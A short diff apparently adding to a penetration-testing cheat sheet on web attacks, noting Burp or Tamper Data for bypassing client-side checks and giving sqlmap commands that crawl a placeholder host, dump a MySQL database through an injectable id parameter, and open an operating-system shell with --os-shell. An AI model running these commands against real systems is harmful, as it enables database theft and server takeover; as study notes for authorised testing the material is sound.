@@ -66,9 +66,16 @@ Once the backdoor is created, we have command execution. We could access this ba
 
 
 Bypassing interface restrictions (like search boxes or client side validation):
+We can bypass these restrictions by using a tool such as Burp or Tamper Data.
+
+Sqlmap:
+sqlmap -u http://10.x.x.x --crawl=1
+sqlmap -u http://10.x.x.x/comment.php?id=737 --dbms=mysql --dump --threads 5
 
 
-
+We can use the parameter --os-shell to try to load a file to the vulnerable web server
+sqlmap -u http://10.x.x.x/comment.php?id=737 --dbms=mysql --os-shell
+If it succeed, we are provided a command shell directly in our terminal.
 
 
 
